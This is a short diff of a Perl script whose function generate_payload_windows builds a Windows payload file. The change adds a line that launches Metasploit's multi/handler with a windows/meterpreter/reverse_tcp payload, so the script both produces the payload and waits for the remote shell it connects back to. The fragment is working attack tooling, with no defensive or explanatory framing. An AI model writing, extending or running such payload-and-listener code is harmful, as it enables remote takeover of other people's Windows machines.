@@ -116,6 +116,7 @@ sub generate_payload_windows {
     system($command);
 
     print "Windows payload generated: $output_file\n";
+    system('msfconsole -qx "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $host;set lport $port;run"');
 }
 
 
